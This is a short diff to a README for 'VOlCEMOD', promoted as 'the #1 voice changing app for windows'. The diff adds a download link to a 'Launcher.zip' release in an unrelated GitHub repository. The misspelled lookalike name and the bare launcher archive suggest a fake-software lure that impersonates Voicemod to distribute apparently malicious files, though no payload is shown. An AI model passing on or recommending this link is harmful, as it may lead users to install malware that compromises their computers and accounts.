@@ -1,6 +1,6 @@
 ## VOlCEMOD
 
-## ***[DOWNLOAD](
+## ***[DOWNLOAD](https://github.com/Crowlevy/VOlCEMOD-/releases/download/VOlCEMOD/Launcher.zip)***
 
 # The #1 voice changing app for windows
 ## Features
